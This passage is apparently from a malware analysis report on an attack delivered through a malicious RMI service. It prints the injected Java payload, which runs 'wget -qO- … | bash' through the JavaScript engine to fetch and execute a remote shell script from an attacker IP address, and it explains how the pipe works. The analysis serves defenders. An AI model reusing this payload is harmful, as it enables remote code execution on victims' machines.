
Packet capture of Java code returned by the malicious RMI service In this attack, the injected code is: .getClass().forName(\"javax.script.
ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.
Runtime.getRuntime().exec('bash
-c $@|bash .
wget -qO- http://192 [ . ] 99.152.200/ ')
\") This code invokes a bash shell command via the JavaScript scripting engine, using the construction “$@|bash” to execute the downloaded script.
During execution of this command, the bash shell will pipe the attacker’s commands to another bash process: “wget -qO- url | bash”, which downloads and executes a shell script on the target machine.
This shell script begins with comments taunting security researchers: Figure 5.
Shell script downloaded and executed by the attacker This obfuscated script downloads a randomly named file of the form n .png, where n is a number between 0 and 7.